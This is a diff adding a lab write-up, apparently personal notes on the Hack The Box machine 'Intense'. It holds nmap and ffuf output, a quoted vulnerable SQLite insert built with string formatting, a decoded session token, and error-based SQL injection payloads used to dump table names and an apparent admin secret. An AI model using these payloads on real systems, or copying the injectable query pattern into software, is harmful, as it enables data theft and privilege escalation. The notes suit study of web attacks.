@@ -1,0 +1,80 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 10:08 EDT
+Nmap scan report for intense.htb (10.10.10.195)
+Host is up (0.049s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
+|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
+|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Intense - WebApp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+ffuf -w ~/wordlists/raft-large-directories.txt -u http://intense.htb/FUZZ:
+  admin   
+  logout  
+  login   
+  home    
+  submit  
+
+/submitmessage: seems vuln to sql?
+  unrecognized token: "')"
+  app.py shows the code: 
+    try:
+      query_db("insert into messages values ('%s')" % message)
+    except sqlite3.Error as e:
+      return str(e)
+    return "OK"
+
+
+read source of /submit pg:
+  i see a zipfile src.zip
+  lwt.py decodes/encodes token? we have token:
+    part1: dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7
+      base64 decode: username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
+    part2: 4uF40RAA+EnwwNCMtQnkEHP/KCjuoVoqqwoPT9mxGvE=
+      base64 decode: gibberish... not base64
+    some admin points are revealed, but require admin role... it seems like you
+    can inject the cookie though to elevate role and see these logs:
+      ever admin function calls is_admin():
+        -admin/
+        -admin/log/view
+        -admin/log/dir
+
+insert into messages values ('%s')
+  normally you cant use select statements... but i found out you can concat and
+  it will let you do selects:
+    message=p' || (SELECT * FROM messages LIMIT 1));--
+    '||(SELECT text FROM kdjflsaj));--
+    ^ wrote python to inject this and test for tables. Found:
+        users
+          oid
+          rowid
+          secret
+        messages
+          data
+          oid
+          rowid
+    SELECT(CASE WHEN 1=0 THEN "if" ELSE "carp" END), runtime fail BINGO!:
+      SELECT (
+        CASE 
+            WHEN 1 THEN "c1"
+            WHEN (SELECT id from NAMES LIMIT 1 OFFSET -99.2) THEN "c2"
+        END
+      )
+        SELECT(CASE WHEN 0=(SELECT 1 from names LIMIT 1) THEN "" ELSE (SELECT 1 from names LIMIT 1 OFFSET .2)END)                                      
+        Select(CASE 0=(SELECT 1)WHEN 1 THEN '' ELSE (SELECT 1 from names LIMIT 1 OFFSET .2)END)
+
+      NOTE: used limit 1 offset <NON INTENGER NUMBER> to cause runtime fail case
+  WE DID IT, there are two users... the secret is:
+    f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
+      this is different that the guest secret that we know, so assume its admin
